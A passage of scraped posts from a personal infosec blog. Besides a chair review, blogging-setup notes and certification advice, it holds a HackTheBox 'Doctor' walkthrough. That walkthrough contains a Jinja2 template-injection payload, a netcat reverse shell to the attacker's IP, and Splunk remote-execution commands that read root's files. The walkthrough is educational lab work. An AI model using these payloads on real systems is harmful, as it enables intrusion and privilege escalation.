" }, { "id": 90, "url": "https://shellsharks.com/herman-miller-logitech-embody-review", "title": "Herman Miller Logitech Embody Review", "body": "2021/02/12 - Like many of us these days (in the pandemic-age), I spend a large portion of any given week sitting in my home-office at my desk. For too long I had resigned myself to sitting in a chair that featured no customization, no back support and no particular ergonomic advantages. Given the time I spend in a chair, I decided I need an upgrade and resolved to find an amazing chair, no matter the cost. TL;DR: The Logitech G Embody has a critical design flaw which results in the chair being very uncomfortable to sit in. This flaw makes this chair a no-go at any price, much less $1500. In my search for the best possible chair, I consistently came across positive reviews for chairs from Herman Miller. Specifically, the Aeron and the Embody were two models that I saw mentioned again and again. After seeing pictures of the Embody, I fell in love with the design (specifically the cool-looking back of the chair). It was then of course that I then discovered the Logitech variant of the traditional Embody chair. Right off the bat though, the problem with this chair is the price. $1500‚Ä¶ For a chair‚Ä¶ But! My mission was to find the best chair for me, and I wasn‚Äôt going to let the cost be too much of an obstacle. The Logitech version of the chair features the same design and features of the regular version but now sports an ‚Äúenhanced gaming seat‚Äù (ironic as I‚Äôll soon find out), which is basically an added layer of cushion on the bottom as well as a copper-infused ‚Äúcooling‚Äù foam embedded within that seat cushion. Couple these added comfort features with (awesome) blue color accents unique to the Logitech version of this chair and I was sold. Yes, this chair costs $1500. But surely this is a worthy investment if it makes sitting for extended periods of time both enjoyable, comfortable and better-for-me right?! The ReviewThe chair arrives in a massive box, completely assembled. You need only open the box and roll it on out - sweet! That said, the chair has a certain heft to it and carrying up a few flights of stairs to my office took a bit of effort. Once I did get it in front of my desk though, I took a step back to admire it. If nothing else, it certainly looked cool! (Please ignore my poor cable-management. ) With the chair in place, I sat down and ran through Herman Miller‚Äôs adjustment guide to get it tweaked to my liking. With the first (fully adjusted) sit, my initial opinion was‚Ä¶ ‚Äúthe chair seems comfortable, maybe not $1500 comfortable, but comfortable all the same. ‚Äù But as I would find out, first impressions only go so far‚Ä¶ Before I get to what I didn‚Äôt like about this chair, let me gush about what it gets right. The seat-back is in my mind the best part of this chair. Moving beyond it‚Äôs unique and interesting design, the PostureFit / BackFit spinal support tech built into the back of this chair feels really good. It not only supports your back in a way that is very comforting but it flexes and moves as you do which helps maintain this support as you change posture or wiggle about in the chair. But(t)!, (pun intended) the seat itself, the bottom of this chair, is where things begin to fail. The Logitech variant of the Embody chair features an ‚Äúenhanced gaming seat‚Äù, the main feature of which is an added 1/2-inch layer of copper-infused cooling foam. What‚Äôs not to like about a little extra cooling-cush for your tush right? Among the many adjustment options this chair supports, there is the ability to extend the seat depth. The problem here is when you extend the seat (which those who are a little taller would likely want to do), the added foam is not extended as well. The result is a very pronounced end to the foam which may not seem like much when you first sit down but as time passes, I began to feel the divide between the normal cushioned part of the chair and the extended, non-cushioned part of the chair. After sitting in the chair a while, I began to feel what seemed like a bar, jutting into my legs and running across the underside of my thighs. It was only after disconnecting the seat flap and inspecting the underside of the seat that I realized it was this exact boundary line where I was feeling the protrusion. The irony here of course is that the one (functional) added feature made to the Logitech version of this chair, the ‚Äúenhanced gaming seat‚Äù is also the feature which dooms it (in my opinion). Though I haven‚Äôt tried the Embody classic, I would suspect it doesn‚Äôt suffer this or any similar design flaw. Only after I made this unfortunate discovery did I find reviews of the chair on Herman Miller‚Äôs website lamenting the same problem‚Ä¶ Backing up for a second. After I determined the chair was uncomfortable due to the ‚Äúprotruding bar-like sensation‚Äù but before I realized why exactly I was feeling that, I contacted Herman Miller support, explaining the discomfort. This is the response I received‚Ä¶ ‚ÄúSorry for the delay. You‚Äôre feeling the extra cushion. There is no defect in the chair. That‚Äôs just the way the fabric and extra cushion were designed. ‚Äù Well alright then, it‚Äôs definitely a feature not a bug! Pros: Awesome design. Will definitely look cool in your work-space. Ergonomics of the seat-back were really fantastic. Lower-back support and it‚Äôs adherence to my spine seemed uniquely impressive. The chair is very adjustable. (Arm height and width, back fit, seat depth, seat height, etc‚Ä¶) Smaller profile seat-back made swiveling my legs out from under my desk easier as I did not have to push the chair out from under the desk in order to get out of the chair. Cons: Foam padding does not extend all the way to the front of the chair. This makes sitting in the chair very uncomfortable. Seat bottom is generally uncomfortable. Arm rests are clunky, a little wonky to adjust and are too easily pushed out or in with accidental pressure. The chair is very creaky/noisy. An Attempt to Fix the ChairI spent $1500 on this piece and despite Herman Miller‚Äôs lack-of-support from their support staff, I still liked enough about it that I felt compelled to try and fix the fundamental flaw plaguing this chair if could. From my previous dissection, I knew I had access to the underside of the seat flap where the built-in padding was. My proposed solution was to buy a 1/2 inch-thich foam yoga mat and cut a piece of it to fit the portion of the extended seat that was foam-less. You can look in wonder upon this brilliance below‚Ä¶ Unfortunately, even with this addition, after some time I still felt that same uncomfortable divide. Perhaps the newly introduced foam wasn‚Äôt quite the same thickness? Or maybe the yoga mat depressed a different amount than the built-in foam? In any case, the chair was still equally uncomfortable. In the end, I take solace in knowing I tried to make it work, but in the end, the enhanced seat cushion did not only fail to enhance the chair, it was in fact the dealbreaker. Luckily enough, Herman Miller has a good return policy. Just remember to keep the box and packaging materials it came with! Moving OnSo my quest continues. After resolving to return the Embody, I did more chair research and stumbled across the oft-reviewed chairs from SecretLab. Perusing the site, I decided on trying out the Secretlab TITAN. I‚Äôm actually sitting in this chair as I finish typing out the Embody review! I‚Äôll post an update if this chair ends up being the one for me. " }, { "id": 91, "url": "https://shellsharks.com/htb-doctor", "title": "HackTheBox: Doctor", "body": "2021/02/06 - This is the first in a series of HackTheBox write-ups I intend on producing. You‚Äôll find that my walkthrough style is very ‚Äúto-the-point‚Äù, with a sprinkling of commentary on my thought process as well as some of the things I tried first before actually figuring out the next step in the exploitation chain. Note: These write-ups assume you have familiarity with HackTheBox, know how to get an account and understand how to connect to the individual boxes themselves over the HtB VPN. Jump to Section Reconnaissance &amp; Foothold User Root OutroDoctorFor this first box, I went with ‚ÄúDoctor‚Äù. This Linux system was rated ‚ÄúEasy‚Äù by HackTheBox and rated closer to a ‚ÄúMedium‚Äù difficulty by HackTheBox users. Reconnaissance &amp; FootholdFirst, I verified connectivity to the target system with the following command. This is NMAP‚Äôs Ping Scan flag (-sn) which performs a couple different types of pings (e. g. ICMP, TCP, etc‚Ä¶) nmap -sn 10. 10. 10. 209 Once I verified connectivity, I did a quick SYN (-sS) port / service discovery scan also using NMAP (sticking with just the default NMAP ports). sudo nmap -sS 10. 10. 10. 209 -sV TIP: You‚Äôll notice I used sudo for this specific NMAP command. This is required when sending raw network traffic which happens by default with the command as written above. With this scan, I‚Äôve identified ports 22, 80 and 8809. The web server (listening on port 80) would be the natural place to start snooping around but the service (Splunkd httpd) listening on 8089 drew my attention first as it isn‚Äôt something I see every day. The service listening on this port is a web server and hosted something clearly Splunk-related. At first glance, I noticed there is a version number (8. 0. 5) visible as well as some links that could prove interesting (named - ‚Äúrpc‚Äù, ‚Äúservices‚Äù, ‚ÄúservicesNS‚Äù and ‚Äústatic‚Äù, respectively). Clicking on some of these gave me a password modal that after a few standard password guess attempts yielded no further entry. I poked around this web server a bit more but couldn‚Äôt find anything that helped push me forward so I decided to check out the web server on port 80 I had discovered earlier. Having turned my attention to the web server on port 80 (http://10. 10. 10. 209). , I began an initial high-level recon sweep‚Ä¶ no robots. txt, no obvious third party web app libraries/components in use (after viewing source and clicking on all the visible links) and no obvious injection points or form fields to abuse‚Ä¶hmm‚Ä¶ What I did notice was the domain info@doctors. htb on the main page. Adding the line ‚Äú10. 10. 10. 209 doctors. htb‚Äù to my /etc/hosts file, I was then able to navigate to the virtual host http://doctors. htb where I found some new functionality. What I found was a portal titled ‚ÄúDoctor Secure Messaging‚Äù. After registering a user, I was then then able to create a ‚Äúmessage‚Äù via the ‚ÄúNew Message‚Äù link in the top right of the portal. Posting this message did nothing particularly interesting and trying a few basic injection payloads in the message form fields didn‚Äôt seem to do much either as the messages themselves we‚Äôre not reflected back to the http://doctors. htb/home page. When viewing the source of the /home page I noticed an interesting nugget - the comment ‚Äú&lt;!-archive still under beta testing‚Äú‚Ä¶ Navigating to doctors. htb/archive page I find merely a blank page. Viewing the source of this page, I see an XML-based RSS feed where the data from the title fields of the messages from the previous functionality have been reflected. This is shown below‚Ä¶ OK, so this is definitely where the box got a little tricky for me and based on the forum posts for this particular system, where it got tricky for a lot of other HackTheBox-ers. Fortunately, some small bit of my past web-app pentesting experience would ultimately come in handy for figuring out how to exploit this particular component. At first, I wasn‚Äôt exactly sure what to do so I resorted to just throwing injection payloads at the title field of the messaging component until something stuck. Some time later, I saw one of my payloads, {{10*10}} evaluate on the /archive page to ‚Äú100‚Äù. It was here, with this payload, I was reminded of an injection-class I had previously found on a penetration test - specifically, Server Side Template Injection (SSTI). So, i started spamming some SSTI payloads. After some time, and plenty of googling - I came across the following blog post https://www. onsecurity. io/blog/server-side-template-injection-with-jinja2/ which housed a payload that worked for me. \{\{request. application. __globals__. __builtins__. __import__('os'). popen('hostname'). read()\}\}Throwing this payload into the messages ‚Äútitle‚Äù field, I get some code execution and output of the command in the /archive as shown below. As you can see, we can now run code on the host ‚ÄúDoctor‚Äù! After confirming I could indeed execute arbitrary commands, I wanted to get a reverse shell in order to more easily peruse the file system, escalate privileges, etc‚Ä¶ To do so, I spun up a netcat listener using ‚Äúnc -nlvp 4444‚Äù on my host system and then dropped the following reverse shell into the previous injection payload. rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10. 10. 14. 29 4444&gt; /tmp/fThe final payload looked as shown below‚Ä¶ \{\{request. application. __globals__. __builtins__. __import__('os'). popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10. 10. 14. 29 4444&gt; /tmp/f'). read()\}\}Now after submitting the message with the payload above in the title and then refreshing the /archive page, I got the shell shoveled back to my host system! User FlagNow, with the initial foothold on ‚ÄúDoctor‚Äù as the ‚Äúweb‚Äù user, first we want to upgrade our shell to a fully interactive TTY shell. We can do so by running the following‚Ä¶ python3 -c 'import pty; pty. spawn( /bin/bash )' Taking a look at /etc/passwd I see two potentially interesting users, ‚Äúshaun‚Äù and ‚Äúsplunk‚Äù. From here, I tried A LOT of typical information gathering and privesc stuff, much of which comes from the classic g0tmilk Linux Privesc guide. After some time, I made my way to /var/log and found an apache backup file with a rather revealing log entry. I found this by grepping for ‚Äúpassword‚Äù using the command below. grep -r password . 2&gt;/dev/nullNote: The 2&gt;/dev/null is going to send my error output to /dev/null so errors won‚Äôt be printed to command output. This cleans up the output of this command. The log entry of interest from this command is as you can see below‚Ä¶ . /apache2/backup:10. 10. 14. 4 - - [05/Sep/2020:11:17:34 +2000] POST /reset_password?email=Guitar123 500 453 http://doctor. htb/reset_password Binary file . /journal/62307f5876ce4bdeb1a4be33bebfb978/system. journal matchesIn this log entry, we can see a password reset which was initiated by shaun. One ‚Äúsu shaun‚Äù with ‚ÄúGuitar123‚Äù later and I am now shaun. Digging around in the Linux host as shaun for a while turned up nothing in terms of progression to root but I was able to pull down the user. txt file in shaun‚Äôs home directory. Root FlagWith a set of credentials in-hand, I decided to return to the Splunkd httpd server I had discovered earlier. Using these creds on that main site of the splunkd server I find that they‚Ä¶work! Ok, great. Now how does that help me get root? After some tooling around with the newly exposed functionality and the ‚Äúrpc‚Äù component of the server, I turned yet again to trusty Google. Quickly into that research stint I came across this blog article which then led me to the handy-dandy tool SplunkWhisperer, second of its name. From the documentation, it appeared this tool could give me code execution. Of course even if I was able to execute code within the context of the user who installed splunkd, that wouldn‚Äôt guarantee I would have root privileges - not unless of course that service was run as root (or someone with sudo/root privs). So back to my low-priv shell on the Linux box I go to check on the origins of the splunkd service. Lo‚Äô and behold, splunkd is running, courtesy of root! (as shown below‚Ä¶) Ok, so root ran splunkd, and splunkd will faithfully execute some code for me via SplunkWhisperer. Let‚Äôs put it all together‚Ä¶ I clone down SplunkWhisperer2, cd to PySplunkWhisperer2 and then try a simple payload, run remotely via PySplunkWhisperer2_remote. py‚Ä¶ git clone https://github. com/cnotin/SplunkWhisperer2. gitcd PySplunkWhisperer2python3 PySplunkWhisperer2_remote. py --host 10. 10. 10. 209 --lhost 10. 10. 14. 29 --username shaun --password Guitar123 --payload idRunning in remote mode (Remote Code Execution)[. ] Authenticating. . .

[+] App removed[+] Stopped HTTP serverBye!Ok‚Ä¶. hmmm‚Ä¶ I didn‚Äôt get much in the way of command output after running SplunkWhisperer. I figure everything looks right with the command syntax so I assumed the code was indeed running as root on the remote machine however this tool just simply doesn‚Äôt provide the command output in it‚Äôs own output. To test this, I whipped up a different (still very simple) command to cat the username for which the service would execute as to a file, write that file to the /tmp directory and then chmod the permissions so I could read it as shaun or web via my already established session. python3 PySplunkWhisperer2_remote. py --host 10. 10. 10. 209 --lhost 10. 10. 14. 29 --username shaun --password Guitar123 --payload whoami &gt; /tmp/whoami. txt; chmod 777 /tmp/whoami. txt Turns out - splunkd was indeed run as root! Alright, now I want the root flag. So instead, I cat the root. txt flag from /root to a file in /tmp, chmod it and then read it the same way as before! python3 PySplunkWhisperer2_remote. py --host 10. 10. 10. 209 --lhost 10. 10. 14. 29 --username shaun --password Guitar123 --payload cat /root/root. txt &gt; /tmp/rootflag. txt; chmod 777 /tmp/rootflag. txt Eureka! Wrap UpOverall, I think this box was indeed (relatively) easy, as HackTheBox themselves said. Though I must admit, parts of it did prove a little tricky for me in practice. Some of my big takeaways from this box were‚Ä¶ SSTI is something I should more regularly account for as part of my normal injection tests. From a defensive perspective, it seems like a good idea to avoid randomly exposing Splunk to untrusted users (if you are an administrator of Splunk) Logs are a great place to hunt for loot. In fact, a little clue related to the log portion of this box is hidden in plain-sight. Thanks to one of my coworkers, the (very) subtle clue, hidden inside the artwork for the box itself, hints at this very thing (take notice of the ‚Äúlog‚Äù and the ‚Äúinjection‚Äù). Take a look for yourself and revel in it‚Äôs unnerving elegance.

Of course I knew this would turn up quite a few results but I‚Äôve really been amazed by how much is out there! Infosec blogs of all shapes and sizes are out there in the wild and I want to find ‚Äòem all. Will try to keep this up-to-date as I run across new sites. I‚Äôve split it into blogs from ‚Äúindividuals‚Äù versus those run by larger commercial organizations. If i‚Äôm missing one you know of, or it‚Äôs your blog that is missing, please contact me! For anyone interested, I‚Äôve made available my exported . opml file (last exported: November 8, 2023) with the sources listed below. You can import this into the RSS reader of your choice! Personally, I use Feedly and can highly recommend the service. (I will try to update this export semi-regularly). - Boutique Security Blogs- Commercial Blogs- Writeup Blogs- Aggro Sites Search is not overly optimized, may be a little jittery. . .

I primarily write about things that I may want as a reference for myself later but also as a place to share with others or simply to shout into the void. I think having a website or blog is a good way to keep record of things you have learned or to cement-in-time the way you feel about things. In my article on getting into the field of information security I mention the benefits of having a blog with respect to standing out as a job applicant. Perhaps one day shellsharks. com could morph into something more but for now, it is of simple intention and therefore requires simplicity with respect to contributing, maintaining, hosting etc‚Ä¶ I‚Äôm not a professional, or even particularly seasoned ‚Äúblogger‚Äù. Shellsharks isn‚Äôt even my first attempt at a blog. What I can say from previous attempts to create as well as current efforts maintaining a blog, is that it is easier said than done. You need to think of things to write about, maybe even coming up with a ‚Äútheme‚Äù or content-niche for your site. You need to decide on a hosting provider. You may want/need to do some level of web design. There‚Äôs SEO stuff to consider. You need to figure out your blogging toolset (e. g. writing apps, image hosting, etc‚Ä¶). All of this in aggregate can be intimidating (and it was!) at first blush, so many may find they just don‚Äôt have enough momentum to really get all of it up and running. This is why a site like Medium may be attractive to some as it takes out some of this initial set-up. You just create an account and start writing. I actually tried Medium but found that I wanted my own piece of digital turf. Enter shellsharks‚Ä¶ HostingLet‚Äôs start with hosting. I wanted something as simple as possible. Ideally, I could just take plain Markdown files, put them somewhere and presto! Blog post ready. This is effectively what I was able to achieve with GitHub pages from GitHub. With GitHub pages, you can get up and running relatively quickly. GitHub pages leverages Jekyll, a simple, static-page, blog-aware, ruby-based, site generator. Jekyll is easy enough to get started with but takes a little digging to master in my opinion. Using my pre-existing Shellsharks GitHub account (you can create an account here), I created a separate repository for the blog and I was off and running. I found the following theme, e. g. ‚ÄúAgus Makmun‚Äù, copied it over to my repo and then started making the necessary changes to get ready for my first blog post. I liked this theme because it was simple, clean and had a decent little search widget. There are plenty of other theme options though if you search around for them. Check out this great guide for more specifics in getting started with GitHub pages. Equipment and ToolingAlright! So I have my hosting platform and the base part of my site ready to go, all I really need now is to start pushing some content to my github repo and have Jekyll do the work with publishing. I wanted to have a very portable writing setup which meant being able to write and edit content as well as maintain my blog, all from an iPad. I have a first-gen, 11-inch, iPad Pro which works pretty well but I think having the larger 12. 9 inch iPad would work better (for those who are interested in replicating my setup). The 11-inch iPad is a little cramped when using two apps side-by-side in the split-view mode which I do often because I am often writing in one window and using a browser or notes app in the second window. Paired with this iPad I have the Smart Keyboard Folio. On my iPad I need a couple of different tools to do all my blogging ‚Äústuff‚Äù‚Ä¶ A markdown-compatible, Dropbox-enabled text-editor with iOS external file provider support. A git client which can authenticate-to and work with my GitHub repositories. A way to publish and get-links-to images hosted in AWS (in an S3 bucket). For my text-editor, I settled on 1Writer (1Writer download here). As mentioned earlier, the text-editor I chose needed to have a few different things. Since I want to write primarily in Markdown, it obviously needed to support Markdown editing. I store my draft articles in Dropbox so preferably it could connect to Dropbox so that I can easily edit draft-posts. Finally, since the git-client I chose (described in the next paragraph) exposes its files via an iOS external file provider, the text-editor needed to support connecting to iOS external file providers. This way, I could easily edit live-posts as well as move draft posts into the file provider for subsequent committing. Working Copy (Working Copy download here) is an awesome, super-powerful git-client that works well with native iOS. It allows you to fully sync any github repo and even exposes the repos via the iOS external file provider internal API which allows other apps to edit local files in these repos. Sites leveraging GitHub pages have usage limits, notably that they cannot be larger than 1 GB. Static sites with mostly text files are typically pretty small but if you include a lot of media (namely, images) in your articles, you may find that you bump up against this 1 GB limit rather quickly. For this reason, I needed an external image-hosting solution. For this I settled on AWS - putting images in an S3 bucket and making these image objects public. So I needed an easy way to push images to my S3 bucket and subsequently get the unique image url for referencing in my blog post. Oddly enough, there is not that many iOS apps (that I could find) which can authenticate to an AWS account and work with file objects in S3 buckets. FileBrowser Biz however is a ‚Äúpro‚Äù app I found which has this functionality (as well as a TON of other file-related functionality). The FileBrowser Biz app allows me to create folders and easily upload files to S3 but does not actually expose the link to the file. To get this link, I created an Apple Shortcuts script, chained together with a Python script (executed using the excellent Pythonista iOS app) to pull down the URL of any S3 object. The Python script leverages the boto3 AWS SDK for Python. You can get the shortcuts script here and the Python script via my GitHub. WorkflowOk so now that I‚Äôve walked you through the tooling and equipment I use, let‚Äôs go over the actual workflow. It‚Äôs actually pretty simple from here‚Ä¶ As I think of ideas, I open 1Writer and add-notes-to or create a new draft post within Dropbox. I‚Äôve connected Dropbox to my 1Writer app so I can easily edit and create files in Dropbox directly from the app. When I‚Äôm ready to start writing the post ‚Äúfor real‚Äù, I clone a draft template within 1Writer and put all content in this new Markdown file. I‚Äôll typically have Safari open in the split-view pane so that I can quickly do research, reference another article or get a link to another page. For any images I want to have in my post, I‚Äôll upload them via the FileBrowser Biz app then use my Shortcuts+Python scripts to get the unique S3 object link. I can reference these directly in my post via Markdown. Once I‚Äôm ready to publish the article, I‚Äôll switch to the Working Copy app and commit/push the new file or changes to a file. I then give GitHub pages+Jekyll a minute or so to do its magic and Presto! The post is published. Pretty simple right?! This makes working on and actually publishing content as frictionless as possible for me which is essential to me actually doing it. Maybe it will even inspire you to start your own blog! Feel free to reach out if you have any questions on getting started or how I might be doing something with respect to Shellsharks.

Jump to Section My Education Journey Assorted Advice What Certification Should You Take? Thoughts on SANS Trainings and GIAC Exams Certification / Training Mini-Reviews Johns Hopkins Cybersecurity Masters ReviewIntroCybersecurity (a. k. a. Information Security or ‚Äúinfosec‚Äù) is an extremely fast-moving, technical field and one that for many, demands near-constant learning. This makes working in the Cybersecurity field both exciting and exhausting. Well above average salaries and an over-abundance of available jobs are just two of the compelling reasons to consider becoming an information security professional. Given the business-critical nature of a security professionals job, these individuals are expected to be highly trained, which (in my experience) typically means certifications, formal training courses and higher education. Infosec is in a bit of a golden age with respect to the incredible amount of trainings, educational programs and online resources which are available, both free and paid, many of which also come with a certification you can sit for. These resources cover a vast array of information security disciplines (e. g. network security, penetration testing, incident response, compliance, etc‚Ä¶), so it can often be overwhelming for both newcomers and veterans to determine where to focus their time, effort and money with respect to getting the best education. To illustrate this point, hop into r/netsecstudents and it won‚Äôt take you long to find post after post asking the same general question - ‚ÄúWhat certificate/training should I take. ‚Äù It‚Äôs a valid question and one that I‚Äôve asked myself numerous times over the years. Whether we‚Äôre trying to improve our resume or gain some new technical capabilities, this question often remains the same. Over the past five years I‚Äôve been fortunate to have been provided a near-unlimited training budget and have been even more fortunate to have been given the time (both by my company and my family) to pursue these academic and learning interests. In this time I was able to achieve/complete a plethora of certifications and training classes as well as start and finish a Masters degree. Having recently completed the degree program as well as having achieved the relatively challenging GIAC GXPN certification, I wanted to take a look back at the last couple years and answer a few questions‚Ä¶ Would I do anything differently? What have I learned? Will these achievements actually benefit me professionally? What certifications we‚Äôre useful? I hope that my somewhat unique perspective can help provide guidance to those asking the question, ‚ÄúWhat certificate/training should I take?‚Äù. My Education JourneyI originally set out to become a developer, attending a four-year university as a computer science major. By the end of my 5 year college run I had switched majors three times, transferred schools and come away not with a CS degree, but with a degree in information security. Degree in hand, I began my search for an entry-level security position but soon found out that the degree alone was not a compelling enough argument. Companies were looking for individuals with experience, even for entry-level positions - something I just didn‚Äôt have. For me, certifications provided a means in which to qualify for positions in the absence of having this experience. Back then, and continuing to this day, a certification (more so than even my 4 year degree!) was enough to put a candidate (like myself) over that lack-of-experience obstacle and in front of some hiring managers. In those early days, I self-paid-for and acquired both the Security+ and the CEH certifications, both of which directly helped land me positions. Studying for certifications and attending training requires motivation and an aptitude for the technical intricacies of the field - neither of these are out of reach for most. I certainly had a hunger to learn and the educational background/aptitude to succeed. Given the immediate success of landing positions shortly after having achieved previous certifications, my aim was to seek out other certification opportunities. Unfortunately, certification exams and training courses also (generally) require a good bit of cash. This put many certifications either completely out of reach for me or far enough away that I wasn‚Äôt sure the ROI was truly there for me to drop my own money on them. During this time, I bounced around several contract gigs, picking up an assortment of experience, always hoping to land at a company that might be willing to invest in me by way of paying for some trainings/certs. After a few years I landed at what is my current place of employment and I finally got my wish - a company able and willing to invest in me. So I took full advantage of it. 16+ certifications and countless trainings‚Ä¶ when I wasn‚Äôt busy with my day job, I was busy with training. Many days, my day job was training. I went from one training to the next, one cert to the next, at such a quick pace, I hardly even had time to actually come back, settle in and practice what I had learned. In hindsight, it‚Äôs easy to see that I became somewhat addicted to the process. Earlier struggles both finding work in the field and funding a cyber security education gave rise to an insatiable need to learn as much as possible and in parallel, get as many certifications and take as many trainings as possible. Now after these past 5 years, I have plenty of letters, plenty of new skills and some wisdom to share‚Ä¶ Quick Q&amp;A: Would I have done anything differently? If I could do it all over again, I would take much more time after each training/certification to really apply newly acquired skills, seeking to truly and permanently absorb what I had learned. I also would have spent more time trying to figure out specifically what area of security I wanted to specialize in, which would have allowed me to carefully craft a tailored training regimen better suited to helping me achieve a more targeted expertise. So what have I learned? It‚Äôs a strange dichotomy, through the course of taking rapid-fire, high-intensity trainings, I was able to learn A LOT of different things very quickly. A side-effect of this however was me forgetting much more than I wanted of what I had learned! Had I been more committed to letting this information soak in through practice and individual research, I may have developed a more robust expertise across these subjects. With this said, I did learn (and absorb) quite a bit. My main areas of focus were penetration testing, vulnerability research, reverse engineering and what I‚Äôll call ‚Äúgeneral security‚Äù. To me, general security is a combination of a number of foundational security-relevant disciplines including networking (TCP/IP), web applications, operating systems, etc‚Ä¶ Between all of the different trainings and courses, I found there was considerable content overlap. I think where I am strongest technically is in these areas of significant overlap. Learning the same thing multiple times (unsurprisingly!) has the effect of really drilling it into the brain. Will these achievements actually benefit me professionally? This I can‚Äôt answer‚Ä¶ yet. Since I haven‚Äôt looked for a new job in the last five years, I haven‚Äôt seen what, if anything, my bundle of certs plus Masters degree would be able to do for me out in the job market. More specifically, I‚Äôm unsure if these accolades would be beneficial in helping me get to my next step, whatever that might be. What I can say is that with each new certification, there is a potential new door that could open (for jobs looking for that specific certification). Though there is certainly diminishing returns with each new cert on a single resume, I have found that recruiters and hiring managers are typically impressed when you have a multitude of them to showcase. I have definitely received many emails from recruiters saying they are very impressed with my certifications and overall experience. So time will tell if they will actually make a difference in any future job searches! At least I can take comfort in knowing my resume will match plenty of certification-related, resume-sourcing keyword searches. What certifications have proved useful? I‚Äôll answer this in more detail in the Certification and Training Mini-Reviews. What certification/training should I take? I‚Äôll get into this in more detail in the section What certification/training should I take? Advicestream: Here is my non-contiguous, random collection of certification/training-related advice/musings‚Ä¶ Studying for / taking certification exams and taking training courses requires time, money and effort/motivation. Keep this in mind when approaching any potential cert/training. Make sure you have all three in place before committing to any course/certification. It‚Äôs hard to put a price tag on that first cert. For those who are having trouble breaking into the field, a certification may be what tips the scale in your favor. In this case, even an expensive cert (for example, a SANS certification) could in-fact pay off quickly if it helps you land that relatively high-paying junior infosec engineer role. Given the high demand for qualified individuals, even entry-level positions can command impressive salaries. With respect to certifications specifically, my recommendation for those looking for that breakout role is to research positions that are of interest to you, see what certifications they are expecting (or mandating) that you have, and then figure out how to get it. Focus on the journey. A certification is nothing more than a piece of paper or a couple of letters behind your name. What matters most is the skills and knowledge you gain while prepping/training for that cert. Take your time to truly understand the material, acquire a solid foundation of knowledge, one that you can build on top of as you become more advanced. Focusing on simply passing a test rather than just understanding the material will hurt you in the long run. ‚Ä¶on the thread of ‚Äúunderstanding the material‚Äù, I have a note for those fortunate enough to take a SANS exam (or similarly ‚Äúopen book‚Äù exam): A common recommendation for SANS exams (even from SANS themselves) is to create an index. I don‚Äôt recommend this. Now i understand people have different test-taking strategies and some people are just innately better at ‚Äútaking tests‚Äù than others, but I think indexing encourages not really understanding the material, but rather, promotes just searching for the answer come test time. Yes, this may make getting the cert easier, and if that is your goal then so be it! But I urge those who are also interested in retaining the material to not create an index, and in that way, when studying, they aim for a better, more robust understanding. With this said, my personal strategy (I‚Äôve never created an ‚Äúindex‚Äù), is to use the little sticky post-its that SANS provides to mark the different chapters/sections of the book (as well as any other potentially information-dense areas of the books). In this way, you can still quickly flip to a section of the course material during the test (or when studying!) to help with recalling certain information. It‚Äôs worth reiterating here, albeit in a different way, take your time. Focus on the material, attempt to gain true comprehension and don‚Äôt seek to just memorize certain data points needed to pass the test. Pay very close attention to the boring stuff. Infosec is a broad field with many disciplines but the core concepts of security, networking, computing, etc‚Ä¶. are shared amongst all of these. This means having a very thorough understanding of the basics will help you excel in all areas of security, from compliance to penetration testing. Government contract roles (which may be more numerous in certain locales) often look for specific certifications. Obtaining one of these certs is an easy way to immediately qualify for these positions. Don‚Äôt depend too much on certifications. Yes, a certification may be able to help you qualify for a job or get your foot in the door for an interview but often it only goes that far. Your peers will likely not think more of you, your boss will likely not promote you, the work itself will not become easier all by merely getting a certification. Focus on what you can learn, the cert is just a bonus. Experience has been and will remain king with respect to ‚Äúproving‚Äù your abilities to a prospective employer. Certifications however, can certainly help a candidate get a foot in the door for an interview or even uniquely qualify them for a role that may explicitly require a specific certification. Certs, trainings, degrees‚Ä¶ ultimately, they serve one of two distinct purposes (in my opinion). Bolstering a resume and acquiring knowledge/increasing skills. Remember this when thinking about what you want to pursue next! Find a way to expand on what you learned during the course of studying for a certification or attending a training by doing your own independent research. At the point where you feel you really understand the material, you can then run off and sign up for the next thing. What Certification or Training Should I Take?: Ok, so let‚Äôs try to answer this primary question. Let‚Äôs approach the answer based on where someone might be in their career or job search. Choose the scenario below which best describes your current standing‚Ä¶ You‚Äôre new to Information Security and are looking to get a job: Do some research on what certifications (if any) the jobs you‚Äôd be interested in are asking for. (Try popular job search websites like Monster, Linkedin and Indeed, to name a few). Where you find some certification requirement commonality amongst these job reqs, take a look at how you can get that specific cert. If the training, or exam voucher is expensive, take a look at what salary you may expect provided you get the job and calculate your return on investment. You may find that investing in yourself by paying for the cert can pay off in a big way. This methodology is more relevant for junior positions as the certification can stand in place of the lack of professional experience as it did for me in my early professional career. You are currently in a junior role and are looking to advance: I‚Äôd recommend a similar approach as above, with the tweak that you will likely be targeting a more advanced certification. Keep in mind though that at this point, unless the job you are looking at is contractually-obligated to supply personnel with certain certifications, it is less likely that a certificate is really what you need to get into your next role. Rather, focus more on the experience that is being asked for on the job req you are interested in. If getting a certification can help you obtain that specific experience, then great! Two birds with one stone. You are a mid-level or senior security professional and are looking to add valuable skills to your resume: Focus on practical certifications and training that can get you to ‚Äúexpert‚Äù level within a specific knowledge area you may already have some expertise in or that can fill an important gap in your overall knowledge. Keep in mind, there‚Äôs plenty of free and paid training out there to help you get there, so don‚Äôt immediately default to trying to pay for some expensive certification or training. Do some research and then get learning! Some ‚Äúdomains‚Äù to keep in mind would be web applications, programming/development, cloud, networking, and incident response. I think focusing more on experience you need rather than some certification is more appropriate in this scenario. You‚Äôre interested in getting into penetration testing: Information security as a profession is made up of a lot of unique sub-disciplines. Penetration testing (a. k. a. ‚ÄúPentesting‚Äù) happens to be one of the more popular aspirations for those entering the field, even though penetration testers as a whole make up only a small fraction of the infosec community. For those interested in infosec, don‚Äôt immediately think that pentesting is what is right for you or that it‚Äôs the only interesting option. Take your time to research everything else you can do in infosec before committing to the pentest path. However, for those that are truly interested, I highly recommend taking a look at the PWK/OSCP from Offensive Security and/or the PTP from eLearnSecurity. Both are practical, lab-based, hands-on certifications with a LOT of good training material. Once completing either of those, I‚Äôd recommend checking out the other, more advanced trainings/certs offered by both Offensive Security and eLearnSecurity. For more info, please check out my reviews for both the PWK/OSCP and PTP courses. You aren‚Äôt sure what security discipline are you interested in yet: I‚Äôd reference my initial advice here. If you want a job in infosec go take a look at what certs are being asked for within the job reqs you are interested in. Otherwise, I probably wouldn‚Äôt throw money at a random cert (yet!). I also have a guide for those interested in getting into the field! If you 